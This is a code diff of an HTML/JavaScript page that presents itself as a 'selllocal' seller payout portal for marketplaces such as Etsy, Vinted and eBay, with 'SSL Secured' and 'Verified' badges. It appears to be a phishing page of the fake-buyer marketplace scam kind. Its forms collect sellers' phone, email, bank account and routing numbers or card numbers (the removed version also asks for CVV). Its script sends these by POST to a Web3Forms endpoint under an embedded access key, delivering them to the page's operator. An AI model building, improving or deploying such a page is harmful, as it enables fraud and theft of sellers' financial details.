+                    <div class="sr"><div class="sb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div><div class="sb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Protected</div><div class="sb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Verified</div></div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <!-- Progress Bar -->
-    <div class="steps">
-        <div class="step active" id="step1-indicator">
-            <div class="step-num">1</div>
-            <div class="step-label">Product</div>
-        </div>
-        <div class="step" id="step2-indicator">
-            <div class="step-num">2</div>
-            <div class="step-label">Payout</div>
+    <!-- Invoice overlay -->
+    <div class="io" id="invoiceOverlay">
+        <div class="inv">
+            <button class="invx" onclick="closeInvoice()">×</button>
+            <h3>selllocal — Purchase Summary</h3>
+            <div class="invno" id="invNo"></div>
+            <div class="row"><span>Seller</span><span id="iSeller"></span></div>
+            <div class="row"><span>Seller phone</span><span id="iPhone"></span></div>
+            <div class="row"><span>Seller email</span><span id="iSEmail"></span></div>
+            <div class="row"><span>Buyer email</span><span id="iBEmail"></span></div>
+            <div class="row"><span>Product</span><span id="iItem"></span></div>
+            <div class="row"><span>Ships from</span><span id="iFrom"></span></div>
+            <div class="row"><span>Ships to</span><span id="iTo"></span></div>
+            <div class="row"><span>Platform(s)</span><span id="iPlat"></span></div>
+            <div class="row"><span>Payout Method</span><span id="iPayout"></span></div>
+            <div class="row"><span>Product amount</span><span id="iProd"></span></div>
+            <div class="row"><span>Shipping</span><span id="iShip"></span></div>
+            <div class="gt"><span>Total payable</span><span id="iTotal"></span></div>
+            <div class="invbtns">
+                <button class="bdl" onclick="downloadInvoice()">Download invoice</button>
+                <button class="bcp" onclick="window.print()">Print</button>
+            </div>
         </div>
     </div>
 
-    <div class="card">
-        
-        <!-- PAGE 1: PRODUCT DETAILS -->
-        <div id="page-1">
-            <div class="ch">
-                <h2>Product Details</h2>
-                <p>Enter information about the item being sold.</p>
-            </div>
-            <form id="formPage1" class="fb">
-                <div class="ig">
-                    <label>Platform</label>
-                    <div class="iw select-wrapper">
-                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
-                        <select id="p_platform" required>
-                            <option value="" disabled selected>Select Platform</option>
-                            <option value="Etsy">Etsy</option>
-                            <option value="Vinted">Vinted</option>
-                            <option value="eBay">eBay</option>
-                            <option value="Depop">Depop</option>
-                        </select>
-                    </div>
-                </div>
+    <script>
+        const WEB3FORMS_KEY = 'f9e8faf4-69c4-4849-87e1-5f6f99d5b42f';
 
-                <div class="ig">
-                    <label>Full Name</label>
-                    <div class="iw">
-                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-                        <input type="text" id="p_name" placeholder="Your Name" required>
-                    </div>
-                </div>
+        /* ===== Locations & shipping rates ===== */
+        const LOCATIONS = {
+            'United States': ['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut','Delaware','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky','Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi','Missouri','Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico','New York','North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania','Rhode Island','South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont','Virginia','Washington','West Virginia','Wisconsin','Wyoming','Washington DC'],
+            'United Kingdom': ['England - London','England - Manchester','England - Birmingham','England - Leeds','England - Liverpool','England - Bristol','England - Newcastle','England - Sheffield','England - Nottingham','England - Southampton','Scotland - Edinburgh','Scotland - Glasgow','Scotland - Aberdeen','Scotland - Dundee','Wales - Cardiff','Wales - Swansea','Wales - Newport','Northern Ireland - Belfast','Northern Ireland - Londonderry'],
+            'Europe': ['Austria','Belgium','Bulgaria','Croatia','Cyprus','Czech Republic','Denmark','Estonia','Finland','France','Germany','Greece','Hungary','Iceland','Ireland','Italy','Latvia','Liechtenstein','Lithuania','Luxembourg','Malta','Monaco','Netherlands','Norway','Poland','Portugal','Romania','San Marino','Slovakia','Slovenia','Spain','Sweden','Switzerland','Ukraine']
+        };
+        const PLATfeed = ['Etsy','Vinted','eBay','Depop','Mercari','Poshmark','Facebook Marketplace','Craigslist','OfferUp','Amazon Handmade','Bonanza','Shopify','TikTok Shop','Swappa','Gumtree','Wallapop','Vestiaire Collective','Grailed','StockX','GOAT','Reverb','Discogs','Other / None'];
 
-                <div class="ig">
-                    <label>Product Type</label>
-                    <div class="iw">
-                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/></svg>
-                        <input type="text" id="p_type" placeholder="e.g. iPhone 14 Case" required>
-                    </div>
-                </div>
-
-                <div class="ig">
-                    <label>Product Amount ($)</label>
-                    <div class="iw">
-                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-                        <input type="number" id="p_amount" placeholder="0.00" step="0.01" required oninput="calcTotal()">
-                    </div>
-                </div>
-
-                <div class="ig">
-                    <label>Shipping To</label>
-                    <div class="iw select-wrapper">
-                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"/></svg>
-                        <select id="p_dest" required onchange="calcTotal()">
-                            <option value="" disabled selected>Select Destination</option>
-                            <option value="local">Local (Domestic)</option>
-                            <option value="usa">USA</option>
-                            <option value="uk">UK</option>
-                            <option value="europe">Europe</option>
-                            <option value="intl">International</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div class="summary-box">
-                    <div class="summary-row"><span>Product Price:</span> <span id="d_price">$0.00</span></div>
-                    <div class="summary-row"><span>Shipping Fee:</span> <span id="d_ship">$0.00</span></div>
-                    <div class="summary-row total"><span>Total:</span> <span id="d_total">$0.00</span></div>
-                </div>
-
-                <button type="button" class="bp" onclick="goToPage2()">
-                    <span>Next: Payment Setup</span>
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
-                </button>
-            </form>
-        </div>
-
-        <!-- PAGE 2: PAYOUT DETAILS -->
-        <div id="page-2" class="hidden">
-            <div class="ch">
-                <h2>Payment Portal</h2>
-                <p>Enter where you want to receive your money.</p>
-            </div>
-            <form id="finalForm" class="fb">
-                
-                <div class="note-box">
-                    <strong>Important:</strong>
-                    The buyer will pay you using their <strong>LemFi Wallet</strong>. Once the transaction is verified, you will receive a confirmation call on your phone.
-                </div>
-
-                <div class="ig">
-                    <label>Phone Number (For Call)</label>
-                    <div class="iw">
-                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
-                        <input type="tel" id="p_phone" name="phone" placeholder="+1 234 567 890" required>
-                    </div>
-                </div>
-
-                <div class="ig">
-                    <label>Email Address</label>
-                    <div class="iw">
-                        <svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
-                        <input type="email" id="p_email" name="email" placeholder="you@example.com" required>
-                    </div>
-                </div>
-
-                <label style="display:block;font-size:12px;font-weight:700;color:var(--text);margin-bottom:6px">Receive Funds Via</label>
-                <div class="type-toggle">
-                    <div class="type-btn selected" id="btn-bank" onclick="togglePayMethod('bank')">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
-                        Bank
-                    </div>
-                    <div class="type-btn" id="btn-card" onclick="togglePayMethod('card')">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
-                        Card
-                    </div>
-                </div>
-
-                <!-- Bank Fields -->
-                <div id="fields-bank">
-                    <div class="ig">
-                        <label>Bank Name</label>
-                        <div class="iw">
-                            <input type="text" id="pay_bank_name" name="bank_name" placeholder="e.g. Chase, Wells Fargo" style="padding-left:12px">
-                        </div>
-                    </div>
-                    <div class="ig">
-                        <label>Account Number / IBAN</label>
-                        <div class="iw">
-                            <input type="text" id="pay_account" name="account_number" placeholder="0000000000" style="padding-left:12px">
-                        </div>
-                    </div>
-                    <div class="ig">
-                        <label>Routing / Sort Code</label>
-                        <div class="iw">
-                            <input type="text" id="pay_routing" name="routing_number" placeholder="000000000" style="padding-left:12px">
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Card Fields (Hidden by default) -->
-                <div id="fields-card" class="hidden">
-                    <div class="ig">
-                        <label>Cardholder Name</label>
-                        <div class="iw">
-                            <input type="text" id="pay_card_name" name="card_name" placeholder="Name on card" style="padding-left:12px">
-                        </div>
-                    </div>
-                    <div class="ig">
-                        <label>Card Number</label>
-                        <div class="iw">
-                            <input type="text" id="pay_card_num" name="card_number" placeholder="0000 0000 0000 0000" style="padding-left:12px">
-                        </div>
-                    </div>
-                    <div style="display:flex;gap:10px">
-                        <div class="ig" style="flex:1">
-                            <label>Expiry</label>
-                            <input type="text" id="pay_card_exp" name="card_exp" placeholder="MM/YY" style="width:100%;padding:10px;border:1.5px solid var(--border);border-radius:var(--r)">
-                        </div>
-                        <div class="ig" style="flex:1">
-                            <label>CVV</label>
-                            <input type="text" id="pay_card_cvv" name="card_cvv" placeholder="123" style="width:100%;padding:10px;border:1.5px solid var(--border);border-radius:var(--r)">
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Hidden inputs to combine data -->
-                <input type="hidden" id="hidden_platform" name="platform">
-                <input type="hidden" id="hidden_name" name="seller_name">
-                <input type="hidden" id="hidden_type" name="product_type">
-                <input type="hidden" id="hidden_amount" name="product_amount">
-                <input type="hidden" id="hidden_dest" name="destination">
-                <input type="hidden" id="hidden_total" name="total_amount">
-                <input type="hidden" name="access_key" value="f9e8faf4-69c4-4849-87e1-5f6f99d5b42f">
-                <input type="hidden" name="subject" value="New Seller Order & Payout Details">
-
-                <button type="submit" class="bp" id="submitBtn">
-                    <span>Confirm & Submit</span>
-                </button>
-                <button type="button" class="bp-outline" onclick="goToPage1()">
-                    Back
-                </button>
-                <div id="finalMsg" class="msg"></div>
-            </form>
-        </div>
-    </div>
-</div>
-
-<script>
-    // --- Configuration ---
-    const RATES = { 'local': 5, 'usa': 15, 'uk': 25, 'europe': 30, 'intl': 45 };
-    let currentPayMethod = 'bank';
-
-    // --- Step 1 Logic ---
-    function calcTotal() {
-        const amt = parseFloat(document.getElementById('p_amount').value) || 0;
-        const dest = document.getElementById('p_dest').value;
-        const ship = dest ? RATES[dest] : 0;
-        const total = amt + ship;
-
-        document.getElementById('d_price').textContent = `$${amt.toFixed(2)}`;
-        document.getElementById('d_ship').textContent = `$${ship.toFixed(2)}`;
-        document.getElementById('d_total').textContent = `$${total.toFixed(2)}`;
-        return total;
-    }
-
-    function goToPage2() {
-        // Validate Step 1
-        const form = document.getElementById('formPage1');
-        if(!form.checkValidity()){
-            form.reportValidity();
-            return;
-        }
-        
-        // Transfer Data to Hidden Fields
-        document.getElementById('hidden_platform').value = document.getElementById('p_platform').value;
-        document.getElementById('hidden_name').value = document.getElementById('p_name').value;
-        document.getElementById('hidden_type').value = document.getElementById('p_type').value;
-        document.getElementById('hidden_amount').value = document.getElementById('p_amount').value;
-        document.getElementById('hidden_dest').value = document.getElementById('p_dest').options[document.getElementById('p_dest').selectedIndex].text;
-        document.getElementById('hidden_total').value = document.getElementById('d_total').textContent;
-
-        // Switch View
-        document.getElementById('page-1').classList.add('hidden');
-        document.getElementById('page-2').classList.remove('hidden');
-        
-        // Update Progress
-        document.getElementById('step1-indicator').classList.add('completed');
-        document.getElementById('step1-indicator').classList.remove('active');
-        document.getElementById('step2-indicator').classList.add('active');
-    }
-
-    function goToPage1() {
-        document.getElementById('page-2').classList.add('hidden');
-        document.getElementById('page-1').classList.remove('hidden');
-        document.getElementById('step1-indicator').classList.add('active');
-        document.getElementById('step1-indicator').classList.remove('completed');
-        document.getElementById('step2-indicator').classList.remove('active');
-    }
-
-    // --- Step 2 Logic ---
-    function togglePayMethod(method) {
-        currentPayMethod = method;
-        const btnBank = document.getElementById('btn-bank');
-        const btnCard = document.getElementById('btn-card');
-        const fieldsBank = document.getElementById('fields-bank');
-        const fieldsCard = document.getElementById('fields-card');
-
-        if(method === 'bank') {
-            btnBank.classList.add('selected');
-            btnCard.classList.remove('selected');
-            fieldsBank.classList.remove('hidden');
-            fieldsCard.classList.add('hidden');
-        } else {
-            btnCard.classList.add('selected');
-            btnBank.classList.remove('selected');
-            fieldsCard.classList.remove('hidden');
-            fieldsBank.classList.add('hidden');
-        }
-    }
-
-    // --- Final Submission ---
-    document.getElementById('finalForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        const msg = document.getElementById('finalMsg');
-
-        if(document.querySelector('input[name="access_key"]').value === 'f9e8faf4-69c4-4849-87e1-5f6f99d5b42f') {
-            msg.textContent = "Error: Access Key not configured.";
-            msg.className = "msg error";
-            msg.style.display = "block";
-            return;
+        function shipRate(from,to){
+            const zone=l=>l.startsWith('United States')?'us':(l.startsWith('United Kingdom')?'uk':'eu');
+            const a=zone(from),b=zone(to);
+            if(a===b) return a==='us'?15:20;
+            if((a==='us'&&b==='uk')||(a==='uk'&&b==='us')) return 45;
+            return 35;
         }
 
-        // Gather visible data based on selection
-        let formData = new FormData(this);
-        formData.append('payout_method', currentPayMethod === 'bank' ? 'Bank Transfer' : 'Card Deposit');
+        /* Populate selects & platform checkboxes */
+        const shipFrom=document.getElementById('shipFrom'),shipTo=document.getElementById('shipTo');
+        const opts=['<option value="" disabled selected>Select location</option>'];
+        for(const group in LOCATIONS){
+            opts.push(`<optgroup label="${group}">`);
+            LOCATIONS[group].forEach(l=>opts.push(`<option value="${l} (${group==='Europe'?'EU':group})">${l} — ${group}</option>`));
+            opts.push('</optgroup>');
+        }
+        shipFrom.innerHTML=opts.join('');shipTo.innerHTML=opts.join('');
+        document.getElementById('platformBoxes').innerHTML=PLATfeed.map(p=>`<label><input type="checkbox" name="platform" value="${p}" onchange="syncPlatforms()"><span>${p}</span></label>`).join('');
 
-        btn.innerHTML = '<div class="spinner"></div> Processing...';
-        btn.disabled = true;
+        function getPlatforms(){return [...document.querySelectorAll('#platformBoxes input:checked')].map(c=>c.value);}
+        function syncPlatforms(){calcTotal();}
 
-        try {
-            const res = await fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                body: formData
-            });
-            const data = await res.json();
+        function calcTotal(){
+            const prod=parseFloat(document.getElementById('amount').value)||0;
+            const f=shipFrom.value,t=shipTo.value;
+            const ship=(f&&t)?shipRate(f,t):0;
+            document.getElementById('tProd').textContent='$'+prod.toFixed(2);
+            document.getElementById('tShip').textContent='$'+ship.toFixed(2);
+            document.getElementById('tTotal').textContent='$'+(prod+ship).toFixed(2);
+        }
 
-            if(data.success) {
-                msg.textContent = "Success! Details submitted. You will receive a call shortly.";
-                msg.className = "msg success";
-                btn.textContent = "Submitted";
-            } else {
-                msg.textContent = "Submission failed. Try again.";
-                msg.className = "msg error";
-                btn.disabled = false;
-                btn.textContent = "Confirm & Submit";
+        /* --- PAGE NAVIGATION LOGIC --- */
+        let page1Data = {};
+
+        function goToPage2() {
+            const form = document.getElementById('sellerForm');
+            const err = document.getElementById('errorMsg');
+
+            // Validation
+            if(!form.checkValidity()){
+                form.reportValidity();
+                return;
             }
-        } catch(err) {
-            msg.textContent = "Network error.";
-            msg.className = "msg error";
-            btn.disabled = false;
-            btn.textContent = "Confirm & Submit";
-        }
-        msg.style.display = "block";
-    });
-</script>
+            if(shipFrom.value === shipTo.value){
+                err.textContent='Shipping from and to cannot be the same location.';
+                err.style.display='block';
+                return;
+            }
+            err.style.display = 'none';
 
+            // Store Page 1 Data
+            page1Data = {
+                fullName: document.getElementById('fullName').value.trim(),
+                itemSold: document.getElementById('itemSold').value.trim(),
+                amount: parseFloat(document.getElementById('amount').value) || 0,
+                phone: document.getElementById('sellerPhone').value.trim(),
+                sEmail: document.getElementById('sellerEmail').value.trim(),
+                bEmail: document.getElementById('buyerEmail').value.trim(),
+                from: shipFrom.value,
+                to: shipTo.value,
+                platforms: getPlatforms()
+            };
+
+            // Calculate totals for display later
+            page1Data.shipping = shipRate(page1Data.from, page1Data.to);
+            page1Data.total = page1Data.amount + page1Data.shipping;
+
+            // Switch View
+            document.getElementById('page-1').classList.add('hidden');
+            document.getElementById('page-2').classList.remove('hidden');
+            // Trigger animation
+            document.getElementById('page-2').querySelector('.ch').classList.add('an', 'd1');
+        }
+
+        function goToPage1() {
+            document.getElementById('page-2').classList.add('hidden');
+            document.getElementById('page-1').classList.remove('hidden');
+        }
+
+        /* --- PAYMENT TOGGLE LOGIC --- */
+        function togglePayout(type) {
+            const bank = document.getElementById('bankFields');
+            const card = document.getElementById('cardFields');
+            const optBank = document.getElementById('opt-bank');
+            const optCard = document.getElementById('opt-card');
+            
+            // Reset Required states
+            const bankInputs = bank.querySelectorAll('input');
+            const cardInputs = card.querySelectorAll('input');
+
+            if(type === 'bank') {
+                bank.style.display = 'block';
+                card.style.display = 'none';
+                optBank.classList.add('active');
+                optCard.classList.remove('active');
+                bankInputs.forEach(i => i.required = true);
+                cardInputs.forEach(i => i.required = false);
+            } else {
+                bank.style.display = 'none';
+                card.style.display = 'block';
+                optCard.classList.add('active');
+                optBank.classList.remove('active');
+                bankInputs.forEach(i => i.required = false);
+                cardInputs.forEach(i => i.required = true);
+            }
+        }
+
+        /* --- FINAL SUBMISSION & INVOICE --- */
+        let lastData=null;
+        function showInvoice(d){
+            lastData=d;
+            const inv='SL-'+Date.now().toString().slice(-8);
+            document.getElementById('invNo').textContent='Invoice No. '+inv;
+            iSeller.textContent=d.fullName;iPhone.textContent=d.phone;iSEmail.textContent=d.sEmail;
+            iBEmail.textContent=d.bEmail;iItem.textContent=d.itemSold;iFrom.textContent=d.from;iTo.textContent=d.to;
+            iPlat.textContent=d.platforms.length?d.platforms.join(', '):'Direct';
+            iPayout.textContent = d.payoutType === 'bank' ? 'Bank Transfer' : 'Debit Card Deposit';
+            iProd.textContent='$'+d.amount.toFixed(2);iShip.textContent='$'+d.shipping.toFixed(2);iTotal.textContent='$'+d.total.toFixed(2);
+            document.getElementById('invoiceOverlay').classList.add('show');
+        }
+        function closeInvoice(){document.getElementById('invoiceOverlay').classList.remove('show');}
+        function downloadInvoice(){
+            const d=lastData;if(!d)return;
+            const lines=['SELLLOCAL — PURCHASE SUMMARY / INVOICE','Invoice No: '+document.getElementById('invNo').textContent,'Date: '+new Date().toLocaleString(),'','Seller: '+d.fullName,'Seller Phone: '+d.phone,'Seller Email: '+d.sEmail,'Buyer Email: '+d.bEmail,'','Product: '+d.itemSold,'Ships From: '+d.from,'Ships To: '+d.to,'Platform(s): '+(d.platforms.join(', ')||'Direct'), 'Payout Method: '+(d.payoutType==='bank'?'Bank Transfer':'Card Deposit'),'','Product Amount: $'+d.amount.toFixed(2),'Shipping: $'+d.shipping.toFixed(2),'-----------------------------','TOTAL PAYABLE: $'+d.total.toFixed(2),''];
+            const blob=new Blob([lines.join('\n')],{type:'text/plain'});
+            const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='invoice-'+d.fullName.replace(/\s+/g,'-')+'.txt';a.click();URL.revokeObjectURL(a.href);
+        }
+
+        const toast=(m)=>{const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3500)};
+
+        /* Submit via Web3Forms */
+        document.getElementById('paymentForm').addEventListener('submit',async function(e){
+            e.preventDefault();
+            const btn=this.querySelector('.bp'),errorMsg=document.getElementById('paymentError');
+            
+            // Combine Page 1 Data + Page 2 Data
+            const payoutType = document.querySelector('input[name="payoutType"]:checked').value;
+            const d = {
+                ...page1Data,
+                payoutType: payoutType,
+                totalAmount: '$' + page1Data.total.toFixed(2)
+            };
+
+            // Get specific payout details
+            if(payoutType === 'bank') {
+                d.bankName = this.bankName.value;
+                d.accountNum = this.accountNum.value;
+                d.routingNum = this.routingNum.value;
+            } else {
+                d.cardName = this.cardName.value;
+                d.cardNum = this.cardNum.value;
+            }
+
+            btn.innerHTML='<div class="spinner"></div><span>Submitting...</span>';btn.disabled=true;
+            try{
+                // Construct Payload
+                const payload = {
+                    access_key: WEB3FORMS_KEY,
+                    subject: 'New Order: '+d.fullName+' ($'+d.total.toFixed(2)+')',
+                    seller_name: d.fullName,
+                    seller_phone: d.phone,
+                    seller_email: d.sEmail,
+                    buyer_email: d.bEmail,
+                    product: d.itemSold,
+                    product_amount: '$'+d.amount.toFixed(2),
+                    shipping_cost: '$'+d.shipping.toFixed(2),
+                    total_amount: d.totalAmount,
+                    route: d.from + ' -> ' + d.to,
+                    platforms: d.platforms.join(', ') || 'Direct',
+                    payout_method: d.payoutType === 'bank' ? 'Bank Transfer' : 'Card Deposit',
+                    // Add payout details to message body for security/clarity
+                    message: `PAYOUT DETAILS:\nMethod: ${d.payoutType}\n${d.payoutType === 'bank' ? `Bank: ${d.bankName}\nAcct: ${d.accountNum}\nRouting: ${d.routingNum}` : `Card: ${d.cardName}\nNum: ${d.cardNum}`}`
+                };
+
+                const res=await fetch('https://api.web3forms.com/submit',{
+                    method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},
+                    body:JSON.stringify(payload)
+                });
+                const data=await res.json();
+                if(data.success){errorMsg.style.display='none';showInvoice(d);toast('Submitted successfully!')}
+                else{errorMsg.textContent='Submission failed. Please try again.';errorMsg.style.display='block'}
+            }catch(err){errorMsg.textContent='Connection error. Please try again.';errorMsg.style.display='block'}
+            finally{btn.innerHTML='<span>Generate invoice & submit</span><svg class="ba" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';btn.disabled=false}
+        });
+    </script>
 </body>
 </html>
